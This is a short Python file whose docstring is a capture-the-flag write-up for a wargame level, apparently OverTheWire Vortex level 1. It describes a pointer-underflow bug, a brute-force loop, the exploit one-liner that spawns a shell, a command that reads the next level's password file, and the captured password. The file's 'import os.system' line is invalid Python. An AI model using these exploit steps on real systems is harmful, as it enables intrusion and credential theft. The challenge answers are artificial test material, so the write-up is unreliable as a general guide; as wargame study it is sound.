#!/usr/bin/python3

import os.system

__docs__ = '''
the asm for this comparision looked like this:
mov eax,[esp+0x14]
and eax,0xff000000
cmp eax,0xca000000

and the asm for the --ptr; statement looked like:
0x08048615 <+85>:    sub    DWORD PTR [esp+0x14],0x1

asm for ptr++[0] = x; :
0x08048607 <+71>:    lea    eax,[esp+0x1c]
0x0804860b <+75>:    mov    DWORD PTR [esp],eax

I must use the --ptr gadget to force the ptr at esp+0x14 to point to $esp+0x14
then use the ptr++[0] = x gadget to write \ca to $esp+0x14

So effectively there is no bounds checking on the --ptr gadget, letting me overwrite
the ptr itself with \ca, letting the cmp jmp to our shell. To solve this problem,
you would need to write something like if ( ptr < buf ) ptr++ else ptr--;

# wasn't sure of the exact stack layout here, so I just used guess and check
vortex1@melinda:/vortex$ for i in {255..270}; do (python -c "print '\x5c' * $i + '\xca'"; cat <(echo 'whoami')) | .
/vortex1 ; echo "run $i" ; done | less

this pattern appeared in the output, so I knew I had some commands executed here,
because we did not see printf(buf) from vortex1
run 260
run 261
run 262

next I executed
vortex1@melinda:/vortex$ (python -c 'print "\x5c" * 261 + "\xca"'; cat) | ./vortex1
<snip> [ buf ] <snip>
whoami
vortex2
cat /etc/vortex_pass/vortex2
23anbT\rE

We've captured the enemy flag!
'''

print(__docs__)
